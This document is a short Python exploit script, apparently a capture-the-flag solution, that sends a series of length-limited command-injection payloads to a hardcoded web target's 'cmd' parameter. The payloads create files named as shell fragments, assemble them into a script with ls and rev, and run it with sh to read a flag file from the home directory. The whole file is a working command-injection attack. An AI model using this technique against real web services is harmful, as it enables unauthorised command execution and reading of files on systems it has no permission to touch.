#-*- coding:utf8-*-

import requests as r

from time import sleep

import random

"""

/home/ctf/code/sandbox/83880775

"""

target = 'http://207.180.200.166:8000/'



reset = target + '?reset=true'



cmd = target + '?cmd='

cd = cmd + 'cd%20/'

# Payload optional characters in certain positions

pos0 = 'm'

pos1 = 'p'

pos2 = 'g'



payload = [

    '>dir',          # >dir

    '>%s\>'%pos0,    # >m  

    '>%st-'%pos1,    # pt-

    '>sl',           # sl

    '*>v',           #  >m pt- sl 

    '>rev',

    '*v>%s'%pos2,    # ls -pt >m

    'nl g',

    # Continue line segmentation cd $HOME && cat flag.txt and write in reverse order

    '>xt',

    '>t',

    '>g.',

    '>la',

    '>\ f',

    '>at',

    '>\ c',

    '>\&',

    '>\ &',

    '>ME',

    '>HO',

    '>\$',

    '>\ ',

    '>cd',

    'sh ' + pos2,

    # the content of g is ls -tk >m, then the reverse order will be reversed,

    'sh ' + pos0,

    'nl ' + pos0

    # Execute the curl commmand, insert cmd 

]

s = r.get(reset)

for i in payload:

    s = r.get(cmd + i)

    print(cmd+i)

    print('[%d]' %s.status_code, s.url)

    print(s.text)
